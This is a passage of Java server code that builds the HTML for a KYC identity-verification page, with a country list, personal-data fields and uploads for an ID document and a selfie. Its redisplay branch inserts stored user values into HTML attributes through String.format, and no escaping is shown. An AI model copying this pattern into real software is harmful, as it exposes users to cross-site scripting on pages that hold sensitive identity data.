                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KI', 'Kiribati')\" class=\"verification__input-list-item\">\n" +
                            "                                Kiribati\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KW', 'Kuwait')\" class=\"verification__input-list-item\">\n" +
                            "                                Kuwait\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KG', 'Kyrgyzstan')\" class=\"verification__input-list-item\">\n" +
                            "                                Kyrgyzstan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LA', 'Laos')\" class=\"verification__input-list-item\">\n" +
                            "                                Laos\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LV', 'Latvia')\" class=\"verification__input-list-item\">\n" +
                            "                                Latvia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LB', 'Lebanon')\" class=\"verification__input-list-item\">\n" +
                            "                                Lebanon\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LS', 'Lesotho')\" class=\"verification__input-list-item\">\n" +
                            "                                Lesotho\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LR', 'Liberia')\" class=\"verification__input-list-item\">\n" +
                            "                                Liberia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LY', 'Libya')\" class=\"verification__input-list-item\">\n" +
                            "                                Libya\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LI', 'Liechtenstein')\" class=\"verification__input-list-item\">\n" +
                            "                                Liechtenstein\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LT', 'Lithuania')\" class=\"verification__input-list-item\">\n" +
                            "                                Lithuania\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LU', 'Luxembourg')\" class=\"verification__input-list-item\">\n" +
                            "                                Luxembourg\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MO', 'Macau SAR China')\" class=\"verification__input-list-item\">\n" +
                            "                                Macau SAR China\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MK', 'Macedonia')\" class=\"verification__input-list-item\">\n" +
                            "                                Macedonia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MG', 'Madagascar')\" class=\"verification__input-list-item\">\n" +
                            "                                Madagascar\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MW', 'Malawi')\" class=\"verification__input-list-item\">\n" +
                            "                                Malawi\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MY', 'Malaysia')\" class=\"verification__input-list-item\">\n" +
                            "                                Malaysia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MV', 'Maldives')\" class=\"verification__input-list-item\">\n" +
                            "                                Maldives\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ML', 'Mali')\" class=\"verification__input-list-item\">\n" +
                            "                                Mali\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MT', 'Malta')\" class=\"verification__input-list-item\">\n" +
                            "                                Malta\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MH', 'Marshall Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Marshall Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MQ', 'Martinique')\" class=\"verification__input-list-item\">\n" +
                            "                                Martinique\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MR', 'Mauritania')\" class=\"verification__input-list-item\">\n" +
                            "                                Mauritania\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MU', 'Mauritius')\" class=\"verification__input-list-item\">\n" +
                            "                                Mauritius\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('YT', 'Mayotte')\" class=\"verification__input-list-item\">\n" +
                            "                                Mayotte\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MX', 'Mexico')\" class=\"verification__input-list-item\">\n" +
                            "                                Mexico\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FM', 'Micronesia')\" class=\"verification__input-list-item\">\n" +
                            "                                Micronesia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MD', 'Moldova')\" class=\"verification__input-list-item\">\n" +
                            "                                Moldova\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MC', 'Monaco')\" class=\"verification__input-list-item\">\n" +
                            "                                Monaco\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MN', 'Mongolia')\" class=\"verification__input-list-item\">\n" +
                            "                                Mongolia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ME', 'Montenegro')\" class=\"verification__input-list-item\">\n" +
                            "                                Montenegro\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MS', 'Montserrat')\" class=\"verification__input-list-item\">\n" +
                            "                                Montserrat\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MA', 'Morocco')\" class=\"verification__input-list-item\">\n" +
                            "                                Morocco\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MZ', 'Mozambique')\" class=\"verification__input-list-item\">\n" +
                            "                                Mozambique\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MM', 'Myanmar [Burma]')\" class=\"verification__input-list-item\">\n" +
                            "                                Myanmar [Burma]\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NA', 'Namibia')\" class=\"verification__input-list-item\">\n" +
                            "                                Namibia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NR', 'Nauru')\" class=\"verification__input-list-item\">\n" +
                            "                                Nauru\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NP', 'Nepal')\" class=\"verification__input-list-item\">\n" +
                            "                                Nepal\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NL', 'Netherlands')\" class=\"verification__input-list-item\">\n" +
                            "                                Netherlands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NC', 'New Caledonia')\" class=\"verification__input-list-item\">\n" +
                            "                                New Caledonia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NZ', 'New Zealand')\" class=\"verification__input-list-item\">\n" +
                            "                                New Zealand\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NI', 'Nicaragua')\" class=\"verification__input-list-item\">\n" +
                            "                                Nicaragua\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NE', 'Niger')\" class=\"verification__input-list-item\">\n" +
                            "                                Niger\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NG', 'Nigeria')\" class=\"verification__input-list-item\">\n" +
                            "                                Nigeria\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NU', 'Niue')\" class=\"verification__input-list-item\">\n" +
                            "                                Niue\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NF', 'Norfolk Island')\" class=\"verification__input-list-item\">\n" +
                            "                                Norfolk Island\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KP', 'North Korea')\" class=\"verification__input-list-item\">\n" +
                            "                                North Korea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MP', 'Northern Mariana Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Northern Mariana Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('NO', 'Norway')\" class=\"verification__input-list-item\">\n" +
                            "                                Norway\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('OM', 'Oman')\" class=\"verification__input-list-item\">\n" +
                            "                                Oman\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PK', 'Pakistan')\" class=\"verification__input-list-item\">\n" +
                            "                                Pakistan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PW', 'Palau')\" class=\"verification__input-list-item\">\n" +
                            "                                Palau\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PS', 'Palestinian Territories')\" class=\"verification__input-list-item\">\n" +
                            "                                Palestinian Territories\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PA', 'Panama')\" class=\"verification__input-list-item\">\n" +
                            "                                Panama\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PG', 'Papua New Guinea')\" class=\"verification__input-list-item\">\n" +
                            "                                Papua New Guinea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PY', 'Paraguay')\" class=\"verification__input-list-item\">\n" +
                            "                                Paraguay\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PE', 'Peru')\" class=\"verification__input-list-item\">\n" +
                            "                                Peru\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PH', 'Philippines')\" class=\"verification__input-list-item\">\n" +
                            "                                Philippines\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PN', 'Pitcairn Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Pitcairn Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PL', 'Poland')\" class=\"verification__input-list-item\">\n" +
                            "                                Poland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PT', 'Portugal')\" class=\"verification__input-list-item\">\n" +
                            "                                Portugal\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PR', 'Puerto Rico')\" class=\"verification__input-list-item\">\n" +
                            "                                Puerto Rico\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('QA', 'Qatar')\" class=\"verification__input-list-item\">\n" +
                            "                                Qatar\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('RO', 'Romania')\" class=\"verification__input-list-item\">\n" +
                            "                                Romania\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('RU', 'Russia')\" class=\"verification__input-list-item\">\n" +
                            "                                Russia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('RW', 'Rwanda')\" class=\"verification__input-list-item\">\n" +
                            "                                Rwanda\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('RE', 'Réunion')\" class=\"verification__input-list-item\">\n" +
                            "                                Réunion\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BL', 'Saint Barthélemy')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Barthélemy\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SH', 'Saint Helena')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Helena\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KN', 'Saint Kitts and Nevis')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Kitts and Nevis\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LC', 'Saint Lucia')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Lucia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('MF', 'Saint Martin')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Martin\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PM', 'Saint Pierre and Miquelon')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Pierre and Miquelon\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VC', 'Saint Vincent and the Grenadines')\" class=\"verification__input-list-item\">\n" +
                            "                                Saint Vincent and the Grenadines\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('WS', 'Samoa')\" class=\"verification__input-list-item\">\n" +
                            "                                Samoa\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SM', 'San Marino')\" class=\"verification__input-list-item\">\n" +
                            "                                San Marino\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SA', 'Saudi Arabia')\" class=\"verification__input-list-item\">\n" +
                            "                                Saudi Arabia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SN', 'Senegal')\" class=\"verification__input-list-item\">\n" +
                            "                                Senegal\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('RS', 'Serbia')\" class=\"verification__input-list-item\">\n" +
                            "                                Serbia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SC', 'Seychelles')\" class=\"verification__input-list-item\">\n" +
                            "                                Seychelles\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SL', 'Sierra Leone')\" class=\"verification__input-list-item\">\n" +
                            "                                Sierra Leone\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SG', 'Singapore')\" class=\"verification__input-list-item\">\n" +
                            "                                Singapore\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SK', 'Slovakia')\" class=\"verification__input-list-item\">\n" +
                            "                                Slovakia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SI', 'Slovenia')\" class=\"verification__input-list-item\">\n" +
                            "                                Slovenia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SB', 'Solomon Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Solomon Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SO', 'Somalia')\" class=\"verification__input-list-item\">\n" +
                            "                                Somalia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ZA', 'South Africa')\" class=\"verification__input-list-item\">\n" +
                            "                                South Africa\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GS', 'South Georgia and the South Sandwich Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                South Georgia and the South Sandwich Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KR', 'South Korea')\" class=\"verification__input-list-item\">\n" +
                            "                                South Korea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ES', 'Spain')\" class=\"verification__input-list-item\">\n" +
                            "                                Spain\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('LK', 'Sri Lanka')\" class=\"verification__input-list-item\">\n" +
                            "                                Sri Lanka\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SD', 'Sudan')\" class=\"verification__input-list-item\">\n" +
                            "                                Sudan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SR', 'Suriname')\" class=\"verification__input-list-item\">\n" +
                            "                                Suriname\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SJ', 'Svalbard and Jan Mayen')\" class=\"verification__input-list-item\">\n" +
                            "                                Svalbard and Jan Mayen\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SZ', 'Swaziland')\" class=\"verification__input-list-item\">\n" +
                            "                                Swaziland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SE', 'Sweden')\" class=\"verification__input-list-item\">\n" +
                            "                                Sweden\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CH', 'Switzerland')\" class=\"verification__input-list-item\">\n" +
                            "                                Switzerland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SY', 'Syria')\" class=\"verification__input-list-item\">\n" +
                            "                                Syria\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ST', 'São Tomé and Príncipe')\" class=\"verification__input-list-item\">\n" +
                            "                                São Tomé and Príncipe\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TW', 'Taiwan')\" class=\"verification__input-list-item\">\n" +
                            "                                Taiwan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TJ', 'Tajikistan')\" class=\"verification__input-list-item\">\n" +
                            "                                Tajikistan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TZ', 'Tanzania')\" class=\"verification__input-list-item\">\n" +
                            "                                Tanzania\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TH', 'Thailand')\" class=\"verification__input-list-item\">\n" +
                            "                                Thailand\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TL', 'Timor-Leste')\" class=\"verification__input-list-item\">\n" +
                            "                                Timor-Leste\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TG', 'Togo')\" class=\"verification__input-list-item\">\n" +
                            "                                Togo\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TK', 'Tokelau')\" class=\"verification__input-list-item\">\n" +
                            "                                Tokelau\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TO', 'Tonga')\" class=\"verification__input-list-item\">\n" +
                            "                                Tonga\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TT', 'Trinidad and Tobago')\" class=\"verification__input-list-item\">\n" +
                            "                                Trinidad and Tobago\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TN', 'Tunisia')\" class=\"verification__input-list-item\">\n" +
                            "                                Tunisia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TR', 'Turkey')\" class=\"verification__input-list-item\">\n" +
                            "                                Turkey\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TM', 'Turkmenistan')\" class=\"verification__input-list-item\">\n" +
                            "                                Turkmenistan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TC', 'Turks and Caicos Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Turks and Caicos Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TV', 'Tuvalu')\" class=\"verification__input-list-item\">\n" +
                            "                                Tuvalu\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('UM', 'U.S. Minor Outlying Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                U.S. Minor Outlying Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VI', 'U.S. Virgin Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                U.S. Virgin Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('UG', 'Uganda')\" class=\"verification__input-list-item\">\n" +
                            "                                Uganda\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('UA', 'Ukraine')\" class=\"verification__input-list-item\">\n" +
                            "                                Ukraine\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AE', 'United Arab Emirates')\" class=\"verification__input-list-item\">\n" +
                            "                                United Arab Emirates\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GB', 'United Kingdom')\" class=\"verification__input-list-item\">\n" +
                            "                                United Kingdom\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('US', 'United States')\" class=\"verification__input-list-item\">\n" +
                            "                                United States\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('UY', 'Uruguay')\" class=\"verification__input-list-item\">\n" +
                            "                                Uruguay\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('UZ', 'Uzbekistan')\" class=\"verification__input-list-item\">\n" +
                            "                                Uzbekistan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VU', 'Vanuatu')\" class=\"verification__input-list-item\">\n" +
                            "                                Vanuatu\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VA', 'Vatican City')\" class=\"verification__input-list-item\">\n" +
                            "                                Vatican City\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VE', 'Venezuela')\" class=\"verification__input-list-item\">\n" +
                            "                                Venezuela\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VN', 'Vietnam')\" class=\"verification__input-list-item\">\n" +
                            "                                Vietnam\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('WF', 'Wallis and Futuna')\" class=\"verification__input-list-item\">\n" +
                            "                                Wallis and Futuna\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('EH', 'Western Sahara')\" class=\"verification__input-list-item\">\n" +
                            "                                Western Sahara\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('YE', 'Yemen')\" class=\"verification__input-list-item\">\n" +
                            "                                Yemen\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ZM', 'Zambia')\" class=\"verification__input-list-item\">\n" +
                            "                                Zambia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ZW', 'Zimbabwe')\" class=\"verification__input-list-item\">\n" +
                            "                                Zimbabwe\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AX', 'Åland Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Åland Islands\n" +
                            "                            </div>\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-address\">\n" +
                            "                    <label class=\"verification__input-label\" for=\"kyc_address\">\n" +
                            "                        Address\n" +
                            "                    </label>\n" +
                            "                    <input id=\"kyc_address\" type=\"text\" value=\"\">\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-phone\">\n" +
                            "                    <div class=\"verification__input-label\">\n" +
                            "                        Phone number\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__input-container verification__input-container-phone\">\n" +
                            "                        <div class=\"verification__input-wrapper\">\n" +
                            "                            <div class=\"verification__input-input \" id=\"verificationPhone\">\n" +
                            "                              <span style=\"margin-left: 5px;\" class=\"verification__input-value\">\n" +
                            "                              <img id=\"selected_country_flag_img\" src=\"../assets/img/DE.svg\" alt=\"\">\n" +
                            "                              </span>\n" +
                            "                            </div>\n" +
                            "                            <div class=\"verification__input-list verification__input-list-phone\">\n" +
                            "                                <div class=\"verification__input-box\">\n" +
                            "                                    <div class=\"verification__input-list-item\">\n" +
                            "                                        <img src=\"../assets/img/DE.svg\" alt=\"\">\n" +
                            "                                    </div>\n" +
                            "                                    <div class=\"verification__input-list-item\">\n" +
                            "                                        <img src=\"../assets/img/UK.svg\" alt=\"\">\n" +
                            "                                    </div>\n" +
                            "                                    <div class=\"verification__input-list-item\">\n" +
                            "                                        <img src=\"../assets/img/USA.svg\" alt=\"\">\n" +
                            "                                    </div>\n" +
                            "                                </div>\n" +
                            "                            </div>\n" +
                            "                        </div>\n" +
                            "                        <input id=\"kyc_phone\" type=\"number\" value=\"\">\n" +
                            "                    </div>\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-date\">\n" +
                            "                    <label class=\"verification__input-label\" for=\"kyc_date_of_birth\">\n" +
                            "                        Date of birth\n" +
                            "                    </label>\n" +
                            "                    <input id=\"kyc_date_of_birth\" value=\"\" type=\"date\">\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-passport\">\n" +
                            "                    <div class=\"verification__input-label\">\n" +
                            "                        Select ID type\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__input-input \" id=\"verificationPassport\">\n" +
                            "                        <span class=\"verification__input-value\">Passport</span>\n" +
                            "                        <div class=\"verification__input-icon\">\n" +
                            "                            <img src=\"../assets/img/arrow.svg\" alt=\"\">\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__input-list verification__input-list-passport\">\n" +
                            "                        <div class=\"verification__input-box\">\n" +
                            "                            <div onclick=\"selectedIDtype('Passport')\" class=\"verification__input-list-item\">\n" +
                            "                                Passport\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedIDtype('Driver license')\" class=\"verification__input-list-item\">\n" +
                            "                                Driver license\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedIDtype('ID card')\" class=\"verification__input-list-item\">\n" +
                            "                                ID card\n" +
                            "                            </div>\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-id\">\n" +
                            "                    <label class=\"verification__input-label\" for=\"kyc_id_number\">\n" +
                            "                        ID number\n" +
                            "                    </label>\n" +
                            "                    <input value=\"\" id=\"kyc_id_number\" type=\"text\" placeholder=\"Enter ID number\">\n" +
                            "                </div>\n" +
                            "            </div>\n" +
                            "            <div class=\"verification__file\">\n" +
                            "                <div class=\"verification__document\">\n" +
                            "                    <div class=\"verification__file-title\">\n" +
                            "                        Upload the document\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__file-description\">\n" +
                            "                        Please provide a clear photo/scan of your document. Please make sure that the photo/scan is complete and clearly visible, in JPG/PNG format\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__file-box\">\n" +
                            "                        <label class=\"verification__file-input\">\n" +
                            "                            <input id=\"image_document\" type=\"file\" onchange=\"getFileName(event, `document`)\">\n" +
                            "                            <img src=\"../assets/img/upload.svg\" alt=\"\">\n" +
                            "                            Choose file\n" +
                            "                        </label>\n" +
                            "                        <div class=\"verification__file-output\" id=\"verification__file-output-document\">\n" +
                            "                            No file chosen\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__selfie\">\n" +
                            "                    <div class=\"verification__file-title\">\n" +
                            "                        Upload a selfie\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__file-description\">\n" +
                            "                        Please upload a photo of yourself that clearly shows your face.\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__file-box\">\n" +
                            "                        <label class=\"verification__file-input\">\n" +
                            "                            <input id=\"image_selfie\" type=\"file\" onchange=\"getFileName(event, `selfie`)\">\n" +
                            "                            <img src=\"../assets/img/upload.svg\" alt=\"\">\n" +
                            "                            Choose file\n" +
                            "                        </label>\n" +
                            "                        <div class=\"verification__file-output\" id=\"verification__file-output-selfie\">\n" +
                            "                            No file chosen\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                </div>\n" +
                            "            </div>\n" +
                            "            <div class=\"verification__submit-container\">\n" +
                            "                <button class=\"verification__submit\" type=\"submit\" id=\"submit_btn\">\n" +
                            "                    Submit for review\n" +
                            "                </button>\n" +
                            "            </div>\n" +
                            "        </div>";
                    out.println(html);
                } else {
                    if ((boolean) verified) {
                        out.println("<div class=\"verification__info verification__info-verified\">\n" +
                                "                    <div class=\"verification__info-img\">\n" +
                                "                        <img src=\"../assets/img/verified.svg\" alt=\"\">\n" +
                                "                    </div>\n" +
                                "                    <div class=\"verification__info-text\">\n" +
                                "                        Account verified\n" +
                                "                    </div>\n" +
                                "                </div>");
                    } else {
                        out.println("<div class=\"verification__info verification__info-progress\">\n" +
                                "      <div class=\"verification__info-img\">\n" +
                                "         <img src=\"../assets/img/progress.svg\" alt=\"\">\n" +
                                "      </div>\n" +
                                "      <div class=\"verification__info-text\">\n" +
                                "         Verification in progress\n" +
                                "      </div>\n" +
                                "   </div>");
                    }
                    String html = String.format("" +
                                    "   <div class=\"verification__inputs\">\n" +
                                    "      <div class=\"verification__input verification__input-first\">\n" +
                                    "         <label class=\"verification__input-label\" for=\"kyc_first_name\">\n" +
                                    "         First name\n" +
                                    "         </label>\n" +
                                    "         <input id=\"kyc_first_name\" type=\"text\" value=\"%s\" disabled=\"\">\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-last\">\n" +
                                    "         <label class=\"verification__input-label\" for=\"kyc_last_name\">\n" +
                                    "         Last name\n" +
                                    "         </label>\n" +
                                    "         <input id=\"kyc_last_name\" value=\"%s\" type=\"text\" disabled=\"\">\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-country\">\n" +
                                    "         <div class=\"verification__input-label\">\n" +
                                    "            Select country\n" +
                                    "         </div>\n" +
                                    "         <div class=\"verification__input-input verification__input-disabled\" id=\"verificationCountry\">\n" +
                                    "            <span class=\"verification__input-value\">%s</span>\n" +
                                    "            <div class=\"verification__input-icon\">\n" +
                                    "               <img src=\"../assets/img/arrow.svg\" alt=\"\">\n" +
                                    "            </div>\n" +
                                    "         </div>\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-address\">\n" +
                                    "         <label class=\"verification__input-label\" for=\"kyc_address\">\n" +
                                    "         Address\n" +
                                    "         </label>\n" +
                                    "         <input id=\"kyc_address\" type=\"text\" value=\"%s\" disabled=\"\">\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-phone\">\n" +
                                    "         <div class=\"verification__input-label\">\n" +
                                    "            Phone number\n" +
                                    "         </div>\n" +
                                    "         <div class=\"verification__input-container verification__input-container-phone\">\n" +
                                    "            <div class=\"verification__input-wrapper\">\n" +
                                    "               <div class=\"verification__input-input verification__input-disabled\" id=\"verificationPhone\">\n" +
                                    "                  <span style=\"margin-left: 5px;\" class=\"verification__input-value\">\n" +
                                    "                  <img id=\"selected_country_flag_img\" src=\"../assets/img/flags/%s.png\" alt=\"\">\n" +
                                    "                  </span>\n" +
                                    "               </div>\n" +
                                    "            </div>\n" +
                                    "            <input id=\"kyc_phone\" type=\"number\" value=\"%s\" disabled=\"\">\n" +
                                    "         </div>\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-date\">\n" +
                                    "         <label class=\"verification__input-label\" for=\"kyc_date_of_birth\">\n" +
                                    "         Date of birth\n" +
